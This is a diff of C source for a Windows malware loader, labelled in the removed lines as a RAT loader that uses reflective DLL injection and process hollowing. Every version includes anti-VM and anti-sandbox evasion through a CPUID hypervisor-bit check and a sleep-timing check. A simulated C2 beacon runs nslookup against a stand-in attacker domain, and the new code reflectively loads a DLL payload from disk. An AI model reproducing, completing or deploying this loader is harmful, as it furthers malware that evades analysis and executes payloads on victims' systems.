@@ -1,20 +1,47 @@
 #include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include "reflective_loader.h"
 #include "process_hollowing.h"
+#include <cpuid.h>
 
-// Advanced Sandbox & VM Detection
+// Load full DLL file into memory
+LPVOID load_payload(const char* path, DWORD* size) {
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[!] Failed to open %s (0x%lx)\n", path, GetLastError());
+        return NULL;
+    }
+
+    *size = GetFileSize(hFile, NULL);
+    if (*size == INVALID_FILE_SIZE) {
+        printf("[!] GetFileSize failed for %s (0x%lx)\n", path, GetLastError());
+        CloseHandle(hFile);
+        return NULL;
+    }
+
+    unsigned char* buffer = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *size);
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, buffer, *size, &bytesRead, NULL) || bytesRead != *size) {
+        printf("[!] Failed to fully read %s: expected %lu bytes, got %lu bytes\n", path, *size, bytesRead);
+        HeapFree(GetProcessHeap(), 0, buffer);
+        CloseHandle(hFile);
+        return NULL;
+    }
+
+    CloseHandle(hFile);
+    printf("[+] Successfully loaded %s (%lu bytes)\n", path, *size);
+    return buffer;
+}
+
+// Basic VM detection
 int detect_vm() {
-    int cpuInfo[4] = { 0 };
-    __cpuid(cpuInfo, 1);
-
-    // Check Hypervisor Present bit (bit 31 of ECX after CPUID with eax=1)
-    if ((cpuInfo[2] >> 31) & 1) {
+    unsigned int eax, ebx, ecx, edx;
+    __cpuid(1, eax, ebx, ecx, edx);
+    if (ecx & (1 << 31)) {
         printf("[!] Hypervisor detected. Exiting.\n");
         return 1;
     }
-
-    // Timing detection (sleep skip detection)
     DWORD start = GetTickCount();
     Sleep(3000);
     DWORD elapsed = GetTickCount() - start;
@@ -22,75 +49,36 @@ int detect_vm() {
         printf("[!] Timing anomaly detected (sandbox).\n");
         return 1;
     }
-
     return 0;
 }
 
-// AES-decrypt payload in memory (dummy stub - encryption step comes later)
-LPVOID decrypt_payload(LPVOID encrypted_payload, DWORD payload_size) {
-    printf("[+] Simulating in-memory decryption of payload.\n");
-    return encrypted_payload; // Replace with real decryption routine
-}
-
-// Simulated basic DNS "beacon" - C2 placeholder
-void c2_communication() {
-    printf("[*] Pinging fake C2 server (simulated)...\n");
+// Fake C2 ping simulation
+void c2_ping() {
+    printf("[*] Pinging fake C2...\n");
     system("nslookup my-fake-c2-domain.com > nul");
-    printf("[+] C2 communication simulation completed.\n");
+    printf("[+] C2 ping done.\n");
 }
 
 int main() {
-    printf("\n===== Advanced RAT Loader (Reflective Injection + Process Hollowing) =====\n");
+    printf("===== Loader — Direct DLL Reflective Injection =====\n");
 
-    // Step 1: Anti-VM and Anti-Sandbox Checks
-    if (detect_vm()) {
-        printf("[!] Environment flagged as sandbox/VM. Exiting.\n");
-        return 1;
+    if (detect_vm()) return 1;
+
+    DWORD file_size = 0;
+    unsigned char* payload = load_payload("dummy_payload.dll", &file_size);
+    if (!payload) return 1;
+    printf("[+] DLL payload loaded (%ld bytes)\n", file_size);
+
+    if (((PIMAGE_DOS_HEADER)payload)->e_magic == IMAGE_DOS_SIGNATURE) {
+        printf("[+] PE Detected — Reflective Injection...\n");
+        reflective_load(payload);
     } else {
-        printf("[+] No sandbox detected. Proceeding...\n");
-    }
-
-    // Step 2: Load Encrypted Payload from File
-    DWORD encrypted_size = 0;
-    LPVOID encrypted_payload = load_payload("payload\\dummy_payload.dll", &encrypted_size);
-    if (!encrypted_payload) {
-        printf("[!] Payload load failed.\n");
-        return 1;
-    }
-    printf("[+] Encrypted payload loaded (%ld bytes).\n", encrypted_size);
-
-    // Step 3: Decrypt Payload in Memory
-    LPVOID decrypted_payload = decrypt_payload(encrypted_payload, encrypted_size);
-    if (!decrypted_payload) {
-        printf("[!] Decryption failed.\n");
-        HeapFree(GetProcessHeap(), 0, encrypted_payload);
+        printf("[!] Invalid PE file. Exiting.\n");
+        HeapFree(GetProcessHeap(), 0, payload);
         return 1;
     }
 
-    // Step 4: Reflective Injection (fileless execution)
-    printf("[*] Executing Reflective Loader...\n");
-    if (!reflective_load(decrypted_payload)) {
-        printf("[!] Reflective injection failed.\n");
-        HeapFree(GetProcessHeap(), 0, encrypted_payload);
-        return 1;
-    }
-    printf("[+] Reflective Injection completed successfully.\n");
-
-    // Step 5: Process Hollowing to notepad.exe
-    printf("[*] Hollowing into explorer.exe...\n");
-    if (!hollow_process("C:\\Windows\\System32\\notepad.exe", decrypted_payload, encrypted_size)) {
-        printf("[!] Hollowing failed.\n");
-        HeapFree(GetProcessHeap(), 0, encrypted_payload);
-        return 1;
-    }
-    printf("[+] Process hollowing succeeded.\n");
-
-    // Step 6: Simulate basic C2 Communication
-    c2_communication();
-
-    // Cleanup
-    HeapFree(GetProcessHeap(), 0, encrypted_payload);
-    printf("[+] Payload memory cleared, execution finished.\n");
-
+    c2_ping();
+    HeapFree(GetProcessHeap(), 0, payload);
     return 0;
 }
